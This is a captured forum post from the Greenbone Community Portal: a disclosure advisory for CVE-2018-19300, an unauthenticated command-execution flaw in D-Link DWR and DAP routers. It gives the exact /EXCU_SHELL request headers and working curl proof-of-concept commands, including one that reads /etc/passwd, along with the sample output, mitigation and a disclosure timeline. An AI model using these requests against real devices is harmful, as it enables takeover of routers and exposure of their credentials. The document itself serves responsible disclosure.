<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers - Vulnerability Tests - Greenbone Community Portal</title>
    <meta name="description" content="Overview
In early November, 2018, while analyzing D-Link DWR devices, we discovered a vulnerability in DWR-711 and DAP-1530 Routers. This vulnerability would allow an unauthenticated attacker to perform shell commands wi&amp;hellip;">
    <meta name="generator" content="Discourse 2.8.0.beta7 - https://github.com/discourse/discourse version be38615afde03371a4b5cbb7eff364fa680de93b">
<link rel="icon" type="image/png" href="https://community.greenbone.net/uploads/default/optimized/1X/83efca338d1b097ed87884a3e0cab6325f74df96_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="https://community.greenbone.net/uploads/default/optimized/1X/a1077f6b04b5ba32b6a24118a071b3245534efe1_2_180x180.png">
<meta name="theme-color" content="#66c430">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="https://community.greenbone.net/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772" />
<script type="application/ld+json">{"@context":"http://schema.org","@type":"WebSite","url":"https://community.greenbone.net","potentialAction":{"@type":"SearchAction","target":"https://community.greenbone.net/search?q={search_term_string}","query-input":"required name=search_term_string"}}</script>
<link rel="search" type="application/opensearchdescription+xml" href="https://community.greenbone.net/opensearch.xml" title="Greenbone Community Portal Search">

      <link href="/stylesheets/desktop_8cc7478c5f79ef7c0ba5b1f0f646603038db3007.css?__ws=community.greenbone.net" media="all" rel="stylesheet" data-target="desktop"  />
      <link href="/stylesheets/desktop_theme_5_68df8aafbe4338b23a3d897763815e71b0f7c998.css?__ws=community.greenbone.net" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="5" data-theme-name="greenbone"/>
    
    
        <link rel="alternate" type="application/rss+xml" title="RSS feed of &#39;CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers&#39;" href="https://community.greenbone.net/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772.rss" />
    <meta property="og:site_name" content="Greenbone Community Portal" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://community.greenbone.net/uploads/default/original/1X/2bd8ed1c87dd1a124f45b394039d3ec4bbf62e8e.png" />
<meta property="og:image" content="https://community.greenbone.net/uploads/default/original/1X/2bd8ed1c87dd1a124f45b394039d3ec4bbf62e8e.png" />
<meta property="og:url" content="https://community.greenbone.net/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772" />
<meta name="twitter:url" content="https://community.greenbone.net/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772" />
<meta property="og:title" content="CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers" />
<meta name="twitter:title" content="CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers" />
<meta property="og:description" content="Overview In early November, 2018, while analyzing D-Link DWR devices, we discovered a vulnerability in DWR-711 and DAP-1530 Routers. This vulnerability would allow an unauthenticated attacker to perform shell commands with full administrative privileges on the vulnerable device. Vulnerability Details  Affected are according to D-Link following devices and firmware versions:  DAP-1530 (All A revisions) before firmware version 1.06b01 DAP-1610 (All A revisions) before firmware version 1.06b01 DWR-..." />
<meta name="twitter:description" content="Overview In early November, 2018, while analyzing D-Link DWR devices, we discovered a vulnerability in DWR-711 and DAP-1530 Routers. This vulnerability would allow an unauthenticated attacker to perform shell commands with full administrative privileges on the vulnerable device. Vulnerability Details  Affected are according to D-Link following devices and firmware versions:  DAP-1530 (All A revisions) before firmware version 1.06b01 DAP-1610 (All A revisions) before firmware version 1.06b01 DWR-..." />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="1 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="9 ❤" />
<meta property="article:published_time" content="2019-03-17T07:38:01+00:00" />
<meta property="og:ignore_canonical" content="true" />


    <script type="application/ld+json">{"@context":"http://schema.org","@type":"QAPage","name":"CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers","mainEntity":{"@type":"Question","name":"CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers","text":"Overview\n\nIn early November, 2018, while analyzing D-Link DWR devices, we discovered a vulnerability in DWR-711 and DAP-1530 Routers. This vulnerability would allow an unauthenticated attacker to perform shell commands with full administrative privileges on the vulnerable device.\n\nVulnerability Detail&hellip;","upvoteCount":9,"answerCount":0,"dateCreated":"2019-03-17T07:38:01.870Z","author":{"@type":"Person","name":""}}}</script>
  </head>
  <body class="crawler">
    
    <header>
      <a href="/">
          <img src="https://community.greenbone.net/uploads/default/original/1X/169af48d9b3d3a1a914b72b837d32e14ad6f738a.png" alt="Greenbone Community Portal" id="site-logo" style="max-width: 150px;">
      </a>
    </header>
    <div id="main-outlet" class="wrap">
        <div id="topic-title">
    <h1>
      <a href="/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772">CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers</a>
    </h1>

      <div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
            <a href="https://community.greenbone.net/c/vulnerability-tests/7" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #25AAE2'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Vulnerability Tests</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='https://community.greenbone.net/tag/advisory' class='discourse-tag' rel="tag">advisory</a>
        </div>
      </div>
  </div>

  


      <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
        <div class='crawler-post-meta'>
          <div itemprop='publisher' itemscope itemtype="http://schema.org/Organization">
            <meta itemprop='name' content='Greenbone Networks GmbH'>
              <div itemprop='logo' itemscope itemtype="http://schema.org/ImageObject">
                <meta itemprop='url' content='https://community.greenbone.net/uploads/default/original/1X/169af48d9b3d3a1a914b72b837d32e14ad6f738a.png'>
              </div>
          </div>
          <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
            <a itemprop="url" href='https://community.greenbone.net/u/_jp'><span itemprop='name'>_jp</span></a>
            
          </span>

          <link itemprop="mainEntityOfPage" href="https://community.greenbone.net/t/cve-2018-19300-remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers/1772">


          <span class="crawler-post-infos">
              <time itemprop='datePublished' datetime='2019-03-17T07:38:01Z' class='post-time'>
                March 17, 2019,  7:38am
              </time>
              <meta itemprop='dateModified' content='2019-04-13T15:28:24Z'>
          <span itemprop='position'>#1</span>
          </span>
        </div>
        <div class='post' itemprop='articleBody'>
          <h2>Overview</h2>
In early November, 2018, while analyzing D-Link DWR devices, we discovered a vulnerability in DWR-711 and DAP-1530 Routers. This vulnerability would allow an unauthenticated attacker to perform shell commands with full administrative privileges on the vulnerable device.
<h2>Vulnerability Details</h2>
<ul>
<li>Affected are according to D-Link following devices and firmware versions:
<ul>
<li>DAP-1530 (All A revisions) before firmware version 1.06b01</li>
<li>DAP-1610 (All A revisions) before firmware version 1.06b01</li>
<li>DWR-111 (All A revisions) before firmware version 1.02v02</li>
<li>DWR-116 (All A revisions) before firmware version 1.06b03</li>
<li>DWR-512 (All B revisions) before firmware version 2.02b01</li>
<li>DWR-711 (All A revisions) through firmware version 1.11</li>
<li>DWR-712 (All B revisions) before firmware version 2.04b01</li>
<li>DWR-921 (All A revisions) before firmware version 1.02b01</li>
<li>DWR-921 (All B revisions) before firmware version 2.03b01</li>
</ul>
</li>
<li>The vulnerability exists within the /EXCU_SHELL URI, to exploit it an attacker would have to send a GET request to it with the following headers
<ul>
<li>
<code>cmdnum: 1</code> (This specifies the number of commands to execute, but 1 is sufficient for this)</li>
<li>
<code>command1: [command]</code> (This is the command to be executed)</li>
<li>
<code>confirm1: n</code> (This specifies that the command should be executed without prior confirmation)</li>
</ul>
</li>
<li>A curl command would look like this:
<ul>
<li><code>curl '[IP]/EXCU_SHELL' -H 'cmdnum: 1' -H 'command1: ls -l /' -H 'confirm1: n'</code></li>
</ul>
</li>
<li>The shell supports all basic bash commands and more, and delivers the output in a HTTP response. The /EXCU_SHELL redirects all input straight to the /bin/bash shell.</li>
<li>
Example:
<ul><li>
<code>curl 'http://[IP]:[Port]/EXCU_SHELL' -H 'cmdnum: 1' -H 'command1: cat /etc/passwd' -H 'confirm1: n' --compressed</code>
<p><code>admin:[Password]:0:0:Adminstrator:/:/bin/sh</code></p>
</li></ul>
</li>
</ul>
<br>
The vulnerability seems to be by design, as the /EXCU_SHELL is used for tasks such as retrieving hardware and firmware version information.
An active check for this vulnerability can be found in the <a href="https://www.greenbone.net/security-feed/" rel="nofollow noopener">Greenbone Security Feed</a>, using the OID <em><a href="https://secinfo.greenbone.net/omp?cmd=get_info&amp;info_type=nvt&amp;info_id=1.3.6.1.4.1.25623.1.0.113294&amp;token=guest" rel="nofollow noopener">1.3.6.1.4.1.25623.1.0.113294</a></em>.
<h3>Mitigation</h3>
<p>The vendor has started to release firmware updates for all affected devices. Please see the vendor advisory linked in the references for more information.</p>
<h3>References</h3>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19300" rel="nofollow noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19300</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-19300" rel="nofollow noopener">https://nvd.nist.gov/vuln/detail/CVE-2018-19300</a></li>
<li><a href="https://www.greenbone.net/schwerwiegende-sicherheitsluecke-in-d-link-routern-entdeckt/" rel="nofollow noopener">https://www.greenbone.net/schwerwiegende-sicherheitsluecke-in-d-link-routern-entdeckt/</a></li>
<li><a href="https://www.greenbone.net/en/serious-vulnerability-discovered-in-d-link-routers/" rel="nofollow noopener">https://www.greenbone.net/en/serious-vulnerability-discovered-in-d-link-routers/</a></li>
<li><a href="https://eu.dlink.com/de/de/support/support-news/2019/march/19/remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers" rel="nofollow noopener">https://eu.dlink.com/de/de/support/support-news/2019/march/19/remote-command-execution-vulnerability-in-d-link-dwr-and-dap-routers</a></li>
<li><a href="https://www.heise.de/security/meldung/Aktuelle-Firmware-Versionen-schliessen-Remote-Code-Luecken-in-D-Link-Routern-4340234.html" rel="nofollow noopener">https://www.heise.de/security/meldung/Aktuelle-Firmware-Versionen-schliessen-Remote-Code-Luecken-in-D-Link-Routern-4340234.html</a></li>
</ul>
<h3>Disclosure Timeline</h3>
<ul>
<li>2018/11/13: Informed D-Link USA Incident Response Team about the vulnerability.
(Further informed D-Link IR Team that the vulnerability will be disclosed if no advisory or fix is released within 90 days)</li>
<li>2018/11/14: Response from D-Link IR Team, asking for specifics about model number and firmware version</li>
<li>2018/11/14: Provided D-Link IR Team with the requested information</li>
<li>2018/11/14: Answer from D-Link IR Team, detailing their plan to go about the disclosure, asking the 3rd party (us) to request a CVE ID</li>
<li>2018/11/15: Requested a CVE ID</li>
<li>2018/11/15: Got assigned CVE-2018-19300</li>
<li>2018/11/16: Informed D-Link IR Team about the CVE ID and asked for a status update within 90 days or once a fix has been developed</li>
<li>2018/11/21: Mail from D-Link Germany, asking for more details and a PoC</li>
<li>2018/11/21: Answered with further details and a PoC in the form of a specific curl request</li>
<li>2019/02/11: End of 90-day deadline</li>
<li>2019/02/19: Contacted D-Link Germany to ask about their progress and to inform about the deadline having been exceeded by a week</li>
<li>2019/02/19: Answer from D-Link Germany that they will inform us as soon as possible</li>
<li>2019/02/26: Informed D-Link that a disclosure is planned for the upcoming week</li>
<li>2019/03/01: Answer from D-Link with information about affected models and fixed firmware versions</li>
<li>2019/03/17: Disclosure of the vulnerability in accordance to our <a href="https://www.greenbone.net/en/responsible-disclosure" rel="nofollow noopener">Responsible Disclosure</a> guidelines as no fix or notification of the vendor was provided to the end user and the deadline was already exceeded by one 36 days</li>
</ul>
        </div>

        <meta itemprop='headline' content='CVE-2018-19300: Remote Command Execution Vulnerability in D-Link DWR and DAP Routers'>
          <meta itemprop='keywords' content='advisory'>

        <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
           <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
           <meta itemprop="userInteractionCount" content="9" />
           <span class='post-likes'>9 Likes</span>
         </div>

         <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
            <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
            <meta itemprop="userInteractionCount" content="0" />
          </div>

            <div class='crawler-linkback-list' itemscope itemtype='http://schema.org/ItemList'>
                  <div itemprop='itemListElement' itemscope itemtype='http://schema.org/ListItem'>
                    <a href="https://community.greenbone.net/t/openvas-plugin-creation-date-is-before-corresponding-cve-publishing-date/3139/4" itemscope itemtype='http://schema.org/DiscussionForumPosting' itemprop='item'>
                      <meta itemprop='url' content='https://community.greenbone.net/t/openvas-plugin-creation-date-is-before-corresponding-cve-publishing-date/3139/4'>
                      <span itemprop='name'>OpenVas plugin creation date is before corresponding CVE publishing date</span>
                    </a>
                    <meta itemprop='position' content='10'>
                  </div>
            </div>
      </div>






    </div>
    <footer class="container wrap">
      <nav class='crawler-nav'>
        <ul>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/' itemprop="url">Home </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/categories' itemprop="url">Categories </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/guidelines' itemprop="url">FAQ/Guidelines </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/tos' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/privacy' itemprop="url">Privacy Policy </a>
          </span>
        </li>
        </ul>
      </nav>
      <p class='powered-by-link'>Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
    </footer>
    
    
  </body>
  
</html>
